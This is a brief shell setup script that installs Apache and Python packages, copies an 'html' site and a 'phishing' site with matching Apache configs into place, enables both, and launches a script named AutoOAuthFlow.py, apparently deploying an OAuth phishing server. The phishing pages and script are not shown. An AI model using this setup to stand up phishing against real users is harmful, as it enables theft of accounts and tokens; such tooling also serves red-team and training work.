sudo apt update && sudo apt-get install apache2 python3-pip
pip3 install requests watchdog
cp ./html /var/www/
cp ./phishing /var/www/
cp ./000-default.conf /etc/apache2/sites-available
cp ./001-phishing.conf /etc/apache2/sites-available
a2ensite 000-default
a2ensite 001-phishing
sudo systemctl restart apache2
python3 /var/www/html/AutoOAuthFlow.py
